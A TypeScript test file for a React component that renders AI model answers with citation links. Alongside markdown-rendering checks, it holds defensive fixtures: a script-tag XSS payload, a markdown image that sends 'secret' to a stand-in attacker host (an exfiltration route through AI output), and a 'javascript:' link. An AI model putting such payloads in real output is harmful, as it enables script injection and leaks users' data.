import { describe, expect, it } from "vitest";
import { renderToStaticMarkup } from "react-dom/server";
import { AnswerBody } from "./AnswerBody";
import type { CitationOut } from "@/lib/types";

const citation = (index: number): CitationOut => ({
  index,
  chunk_id: `c${index}`,
  url: `https://x/${index}`,
  path: `path-${index}`,
  gold: false,
});

const render = (answer: string, citations: CitationOut[] = [citation(1)]) =>
  renderToStaticMarkup(<AnswerBody answer={answer} citations={citations} />);

describe("AnswerBody", () => {
  it("renders a citation inside a list item as a source-tile link within the <li>", () => {
    const html = render("- Install it [1].\n- Run it.");
    expect(html).toMatch(/<li[^>]*>(?:(?!<\/li>)[\s\S])*Install it(?:(?!<\/li>)[\s\S])*<a href="https:\/\/x\/1"/);
  });

  it("renders bold, ordered lists and headings as real elements, not raw markdown", () => {
    const html = render("## Steps\n\n1. **Install** the tooling\n2. Run it");
    expect(html).toContain("<strong");
    expect(html).toContain("<ol");
    expect(html).toContain("<h3");
    expect(html).not.toContain("**");
  });

  it("renders a dagger-annotated marker inside bold text as a tile", () => {
    const html = render("**Install the tooling 【1†source】**");
    expect(html).toMatch(/<strong[^>]*>(?:(?!<\/strong>)[\s\S])*<a href="https:\/\/x\/1"/);
  });

  it("leaves [1] inside a fenced code block literal, never a tile", () => {
    const html = render("```python\nitems[1]\n```");
    expect(html).toContain("items[1]");
    expect(html).not.toContain("<a ");
  });

  it("renders an unclosed fence mid-stream without throwing", () => {
    expect(() => render("Here is code:\n\n```python\nprint('hi')")).not.toThrow();
  });

  it("escapes raw HTML from the model instead of injecting it", () => {
    const html = render("<script>alert(1)</script>");
    expect(html).not.toContain("<script");
    expect(html).toContain("&lt;script&gt;");
  });

  it("drops markdown images so the browser never fetches a model-chosen URL", () => {
    const html = render("![x](https://evil.example/p.png?q=secret)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("evil.example");
  });

  it("neutralises javascript: link targets", () => {
    const html = render("[click](javascript:alert(1))");
    expect(html).not.toContain("javascript:");
  });
});
